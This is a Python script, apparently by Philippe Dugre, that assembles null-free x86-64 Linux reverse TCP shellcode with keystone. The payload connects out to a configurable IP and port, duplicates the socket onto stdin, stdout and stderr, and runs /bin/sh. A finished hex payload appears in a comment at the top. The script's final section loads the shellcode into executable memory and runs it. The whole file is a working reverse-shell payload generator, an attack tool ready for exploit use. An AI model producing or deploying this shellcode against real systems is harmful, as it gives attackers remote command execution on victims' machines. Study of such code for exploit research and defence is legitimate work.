#!/usr/bin/env python3
# launch nc -nlvp 4444 (connects to 127.0.0.1)
import ctypes, struct, binascii, os, socket
from keystone import *

#####################################################
#                                                   #
#   Dynamic null-free reverse TCP shell(65 bytes)   *
#           Written by Philippe Dugre               #
#                                                   #
#####################################################

#shellcode = 	b"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e"
#shellcode += 	b"\x0f\x05\x97\xb0\x2a\x48\xb9\xfe\xff\xee"
#shellcode += 	b"\xa3\x80\xff\xff\xfe\x48\xf7\xd9\x51\x54"
#shellcode += 	b"\x5e\xb2\x10\x0f\x05\x6a\x03\x5e\xb0\x21"
#shellcode += 	b"\xff\xce\x0f\x05\x75\xf8\x99\xb0\x3b\x52"
#shellcode += 	b"\x48\xb9\x2f\x62\x69\x6e\x2f\x2f\x73\x68"
#shellcode += 	b"\x51\x54\x5f\x0f\x05"

# This script requires keystone to generate the shellcode,
# but it can easily be compiled with nasm with a few modifications.

# Generates struct from IP and port
def sockaddr():

    # Change this
    IP = "127.0.0.1"
    PORT = 4444

    family = struct.pack('H', socket.AF_INET)
    portbytes = struct.pack('H', socket.htons(PORT))
    ipbytes = socket.inet_aton(IP)
    number = struct.unpack('Q', family + portbytes + ipbytes)
    number = -number[0]        #negate
    return "0x" + binascii.hexlify(struct.pack('>q', number)).decode('utf-8')


# Function to format shellcode to a printable output. Currently python3 formatting.
# Modify according to the language you use.
def format_shellcode(shellcode):
    LINE_LENGTH=40
    raw = binascii.hexlify(shellcode)
    escaped = (b"\\x" + b"\\x".join(raw[i:i+2] for i in range (0, len(raw), 2))).decode('utf-8')
    lines = [escaped[i: i+LINE_LENGTH] for i in range(0, len(escaped), LINE_LENGTH)]
    return "shellcode = \tb\"" + "\"\nshellcode += \tb\"".join(lines) + "\""

LEFT3 = ".byte 0xf6; .byte 0x48; .byte 0xc7; .byte 0xc0" # but REQUIRES rax unchanged!! (test   BYTE PTR [rax-0x39],0xc0)
LEFT2 = ".byte 0x3d; .byte 0x00; .byte 0x48; .byte 0xc7; .byte 0xc0" # no constraint (cmp    eax,0xc0c74800)
LEFT2_SPECIAL = ".byte 0x68; .byte 0x2b; .byte 0x48; .byte 0xc7; .byte 0xc0" # pushes junk to stack
def main():
    # Note: null-byte depends on the address and port.
    # Special modifications might be needed for some address.
    address = sockaddr()

    # Shellcode is here
    assembly = (
	"mov rax, r12; LEFT3; mov cl, 0x6e; LEFT2; mov ch, 0x69; LEFT2; bswap ecx; LEFT2; mov cl, 0x2f; LEFT2; mov ch, 0x62; LEFT2;" # /bin//sh  0x68732f2f6e69622f
	"mov dl, 0x2f; LEFT2; mov dh, 0x2f; LEFT2; bswap edx; LEFT2; mov dl, 0x68; LEFT2; mov dh, 0x73; LEFT2;" # /bin//sh
	"bswap rdx; LEFT3; add rdx, rcx; LEFT3; push rdx; nop; LEFT2;"

	"mov cl, 0x5c; LEFT2; mov ch, 0x11; LEFT2; bswap ecx; LEFT2; mov cl, 0x02; LEFT2; mov ch, 0x00; LEFT2;" # neg(ipaddr) 0x01 00 00 7f 5c 11 00 02
	"mov dl, 0x7f; LEFT2; mov dh, 0x00; LEFT2; bswap edx; LEFT2; mov dl, 0xf1; LEFT2; mov dh, 0x00; LEFT2;" # neg(ipaddr)
	"bswap rdx; LEFT3; add rdx, rcx; LEFT3;"
	"xor ebx,ebx; LEFT2; mov bl, 0xf0; LEFT2; bswap rbx; LEFT3; xor rdx, rbx; LEFT3; push rdx; nop; LEFT2;"
 

        "socket:                             "
        "   push byte 41; LEFT2;"      # Push/pop will set syscall num
        "   pop rax; cdq; LEFT2;"      # cdq sets rdx to 0 if rax is positive
        "   push byte 2; LEFT2;"      # AF_INET = 2
        "   pop rdi; nop; LEFT2;"
        "   push byte 1; LEFT2;"      # SOCK_STREAM = 1
        "   pop rsi; nop; LEFT2;"
        "   syscall; LEFT2;"      # socket(AF_INET, SOCK_STREAM, 0)
        "connect:                           ;"
        "   xchg eax, edi; nop; LEFT2;"      # rdi is 2, so moving only al is doable
        "   mov al, 42; test   eax, 0xc0c74800;"

        "   push rsp ; pop rsi; LEFT2;"      # mov rsi, rsp. This it the pointer to sockaddr
        "   mov dl, 16; LEFT2;"      # sockaddr length
        "   syscall; LEFT2;"      # connect(s, addr, len(addr))
        "dup2:                              ;"
        "   push byte 3; LEFT2;"      # Start with 3 and decrement
        "   pop rsi; nop; LEFT2;"
        "dup2_loop:                          "      # Duplicate socket fd into stdin,
                                                    # stdout and stderr, which fd are 0, 1 and 2
        "   mov al, 33; LEFT2;"      # If there is no error, rax is 0 on connect and dup2
        "   dec esi; LEFT2_SPECIAL;"
        "   syscall; LEFT2_SPECIAL;"      # dup2(s, rsi)
        "   jnz dup2_loop; LEFT2_SPECIAL;"      # Jump when esi == 0
        "execve:                             "
        "   pop rcx; pop rcx; LEFT2; pop rcx; pop rcx; LEFT2; pop rcx; pop rcx; LEFT2; pop rcx; pop rcx; LEFT2; pop rcx; nop; LEFT2; cdq ; nop; LEFT2;"
        "   mov al, 59; LEFT2;"      # execve syscall is 59
        "   push rdx; push rcx; LEFT2;"      # Put null-byte in /bin//sh
        "   push rsp; pop rdi; LEFT2;"      # rsp points to the top of the stack, which is occupied by /bin/sh
        "   syscall; LEFT2;"      # execve('/bin//sh', 0, 0)
    .replace("LEFT3", LEFT3).replace("LEFT2_SPECIAL", LEFT2_SPECIAL).replace("LEFT2", LEFT2))

    engine = Ks(KS_ARCH_X86, KS_MODE_64)
    shellcode, count = engine.asm(assembly)
    shellcode = bytearray(shellcode) # Needs to be mutable for later

    print("Number of instructions: " + str(count))

    # Print shellcode in a copy-pasteable format
    print()
    print("Shellcode length: %d" % len(shellcode))
    print()
    print(format_shellcode(shellcode))
    print()

    #####################################################################
    #                   TESTING THE SHELLCODE                           #
    #####################################################################

    # The rest of the script is used to test the shellcode. Don't run this if you just need the shellcode


    # Leave time to attach the debugger
    print("If you want to debug, attach the debugger to the python process with pid %d then press enter." % os.getpid())
    input()

    # Load libraries
    libc = ctypes.cdll.LoadLibrary("libc.so.6")
    libpthread = ctypes.cdll.LoadLibrary("libpthread.so.0")

    # Put the shellcode into a ctypes valid type.
    shellcode = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)

    # Both function returns 64bits pointers
    libc.malloc.restype = ctypes.POINTER(ctypes.c_int64)
    libc.mmap.restype = ctypes.POINTER(ctypes.c_int64)

    # Get page size for mmap
    page_size = libc.getpagesize()

    # mmap acts like malloc, but can also set memory protection so we can create a Write/Execute shellcodefer
    # void *mmap(void *addr, size_t len, int prot, int flags,
    #   int fildes, off_t off);
    ptr = libc.mmap(ctypes.c_int64(0),      # NULL
            ctypes.c_int(page_size),        # Pagesize, needed for alignment
            ctypes.c_int(0x07),             # Read/Write/Execute: PROT_READ | PROT_WRITE | PROT_EXEC
            ctypes.c_int(0x21),             # MAP_ANONYMOUS | MAP_SHARED
            ctypes.c_int(-1),               # No file descriptor
            ctypes.c_int(0))                # No offset

    # Copy shellcode to newly allocated page.
    libc.memcpy(ptr,                        # Destination of our shellcode
                shellcode,                        # Shellcode location in memory
                ctypes.c_int(len(shellcode)))     # Nomber of bytes to copy

    # Allocate space for pthread_t object.
    # Note that pthread_t is 8 bytes long, so we'll treat it as an opaque int64 for simplicity
    thread = libc.malloc(ctypes.c_int(8))

    input('MMAP')
    # Create pthread in the shellcodefer.
    # int pthread_create(pthread_t *thread, const pthread_attr_t *attr,
    #   void *(*start_routine) (void *), void *arg);
    libpthread.pthread_create(thread,       # The pthread_t structure pointer where the thread id will be stored
                            ctypes.c_int(0),# attributes = NULL
                            ptr,            # Our shellcode, which is what we want to execute
                            ctypes.c_int(0))# NULL, as we don't pass arguments

    # Wait for the thread.
    # int pthread_join(pthread_t thread, void **retval);
    libpthread.pthread_join(thread.contents,# Here, we pass the actual thread object, not a pointer to it
                        ctypes.c_int(0))# Null, as we don't expect a return value


if(__name__ == "__main__"):
    main()
